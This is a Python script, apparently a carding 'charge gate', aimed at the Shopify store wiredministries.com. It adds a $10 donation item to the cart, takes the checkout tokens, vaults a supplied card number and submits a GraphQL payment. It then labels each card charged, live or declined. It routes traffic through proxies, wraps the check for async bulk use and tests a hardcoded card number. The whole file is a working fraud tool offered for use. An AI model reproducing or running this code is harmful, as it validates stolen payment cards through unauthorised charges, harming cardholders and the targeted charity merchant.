"""
Shopify $10.00 Charge Gate Engine
Target Merchant: wiredministries.com
Flow: Add to cart -> Checkout init -> deposit.shopifycs.com -> SubmitForCompletion GraphQL
"""
import requests
import re
import json
import html
import sys
import uuid
import random
import time
import asyncio

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

def _format_proxy(p):
    if not p:
        return None
    ps = str(p).strip()
    if ps.startswith(("http://", "https://", "socks5://", "socks4://")):
        return ps
    parts = ps.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{ps}"

def check_card_shopify_charge_sync(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """
    Synchronous Shopify $10.00 Charge Check.
    Returns: (is_live, status_str, response_str, raw_text)
    """
    card_str = f"{cc}|{mm}|{yy}|{cvc}"
    if len(yy) == 2:
        yy = "20" + yy
    mm = mm.zfill(2)

    proxy_formatted = _format_proxy(proxy_url)
    proxies = {"http": proxy_formatted, "https": proxy_formatted} if proxy_formatted else None

    s = requests.Session()
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    })

    try:
        # STEP 1 - Add product to cart ($10.00 / donation product)
        headers1 = {
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryvtMfMS7ihgPqCSmW',
            'origin': 'https://wiredministries.com',
            'referer': 'https://wiredministries.com/products/donate',
        }
        data1 = (
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="form_type"\r\n\r\nproduct\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="utf8"\r\n\r\n✓\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="id"\r\n\r\n6889401221181\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="quantity"\r\n\r\n1\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="add"\r\n\r\n\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="product-id"\r\n\r\n516727406653\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW\r\n'
            'Content-Disposition: form-data; name="section-id"\r\n\r\nproduct-template\r\n'
            '------WebKitFormBoundaryvtMfMS7ihgPqCSmW--\r\n'
        )
        r1 = s.post('https://wiredministries.com/cart/add', headers=headers1, data=data1, proxies=proxies, timeout=15)
        if r1.status_code != 200:
            return False, "DECLINED ❌", f"Failed adding product (HTTP {r1.status_code})", r1.text[:200]

        # STEP 2 - Checkout init & parse meta tokens
        r_co = s.post('https://wiredministries.com/cart', data={'updates[]': '1', 'note': '', 'checkout': 'Check out'}, proxies=proxies, timeout=15)
        checkout_html = r_co.text

        def get_meta(name):
            m = re.search(rf'<meta name="{name}" content="([^"]+)"', checkout_html)
            if m:
                raw_val = html.unescape(m.group(1))
                return raw_val.strip('"')
            return None

        session_token = get_meta("serialized-sessionToken")
        source_token = get_meta("serialized-sourceToken")
        if not session_token:
            return False, "DECLINED ❌", "Failed to retrieve Shopify sessionToken", checkout_html[:200]

        # STEP 3 - Deposit Card to Shopify CS Vault
        headers3 = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopifycs.com',
            'referer': 'https://checkout.shopifycs.com/',
        }
        json_data3 = {
            'credit_card': {'number': cc, 'month': mm, 'year': yy, 'verification_value': cvc, 'name': 'John Doe'},
            'payment_session_scope': 'wiredministries.com'
        }
        res3 = requests.post('https://deposit.shopifycs.com/sessions', headers=headers3, json=json_data3, proxies=proxies, timeout=15)
        vault_data = res3.json()
        vault_session_id = vault_data.get('id')
        if not vault_session_id:
            err_msg = vault_data.get('message') or "Card Tokenization Failed"
            return False, "DECLINED ❌", err_msg, json.dumps(vault_data)

        # STEP 4 - Submit Payment to Shopify GraphQL Engine
        headers4 = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://wiredministries.com',
            'referer': f'https://wiredministries.com/checkouts/cn/{source_token}/en-us',
            'x-checkout-one-session-token': session_token,
        }

        attempt_token = str(uuid.uuid4())
        mutation_submit = {
            'query': '''mutation SubmitForCompletion($attemptToken: String!, $input: NegotiationInput!) {
              submitForCompletion(attemptToken: $attemptToken, input: $input) {
                __typename
                ... on SubmitSuccess {
                  receipt {
                    __typename
                    ... on ProcessedReceipt {
                      id
                      confirmationPage { url }
                    }
                    ... on FailedReceipt {
                      id
                      processingError {
                        __typename
                        ... on PaymentFailed {
                          code
                          messageUntranslated
                        }
                      }
                    }
                  }
                }
                ... on SubmittedForCompletion {
                  receipt {
                    __typename
                    ... on FailedReceipt {
                      id
                      processingError {
                        __typename
                        ... on PaymentFailed {
                          code
                          messageUntranslated
                        }
                      }
                    }
                    ... on ProcessedReceipt {
                      id
                      confirmationPage { url }
                    }
                  }
                }
                ... on SubmitFailed {
                  reason
                }
              }
            }''',
            'variables': {
                'attemptToken': attempt_token,
                'input': {
                    'sessionInput': {
                        'sessionToken': session_token
                    },
                    'payment': {
                        'totalAmount': {
                            'value': {
                                'amount': '10.00',
                                'currencyCode': 'USD'
                            }
                        },
                        'paymentLines': [
                            {
                                'amount': {
                                    'value': {
                                        'amount': '10.00',
                                        'currencyCode': 'USD'
                                    }
                                },
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'sessionId': vault_session_id,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'firstName': 'John',
                                                'lastName': 'Doe',
                                                'address1': '123 Main St',
                                                'city': 'New York',
                                                'zoneCode': 'NY',
                                                'postalCode': '10001',
                                                'countryCode': 'US',
                                                'phone': '2125551234'
                                            }
                                        }
                                    }
                                }
                            }
                        ]
                    },
                    'buyerIdentity': {
                        'email': 'johndoe9981@gmail.com'
                    }
                }
            },
            'operationName': 'SubmitForCompletion'
        }

        r_sub = s.post('https://wiredministries.com/checkouts/unstable/graphql', headers=headers4, json=mutation_submit, proxies=proxies, timeout=20)
        res_text = r_sub.text

        if "ProcessedReceipt" in res_text or "confirmationPage" in res_text or "Thank you for your order" in res_text:
            return True, "CHARGED ✅", "Thank you for your order ($10.00)", res_text
        elif "incorrect_cvc" in res_text or "security code is incorrect" in res_text:
            return True, "APPROVED 🟩", "Your card's security code is incorrect (CCN Live)", res_text
        elif "insufficient_funds" in res_text:
            return True, "APPROVED 🟩", "Insufficient Funds (Card Live)", res_text
        elif "card_declined" in res_text or "PaymentFailed" in res_text:
            match_msg = re.search(r'"messageUntranslated":"([^"]+)"', res_text)
            err = match_msg.group(1) if match_msg else "Card Declined"
            return False, "DECLINED 🔴", err, res_text
        else:
            match_reason = re.search(r'"reason":"([^"]+)"', res_text) or re.search(r'"message":"([^"]+)"', res_text)
            err = match_reason.group(1) if match_reason else "Payment Failed"
            return False, "DECLINED 🔴", err, res_text

    except Exception as e:
        return False, "ERROR ⚠️", str(e), ""

async def check_card_shp10(cc: str, mm: str, yy: str, cvc: str, proxy_url: str | None = None) -> tuple[bool, str, str, str]:
    """Async wrapper for check_card_shopify_charge_sync"""
    return await asyncio.to_thread(check_card_shopify_charge_sync, cc, mm, yy, cvc, proxy_url=proxy_url)

if __name__ == '__main__':
    test_c = sys.argv[1] if len(sys.argv) > 1 else '4033060047342909|08|28|667'
    p = test_c.split('|')
    print(f"[*] Testing Standalone Shopify $10.00 Engine on: {test_c}")
    start = time.time()
    is_live, status, response, raw = asyncio.run(check_card_shp10(p[0], p[1], p[2], p[3]))
    elapsed = round(time.time() - start, 2)
    print(f"\nStatus: {status}\nResponse: {response}\nTime: {elapsed}s")
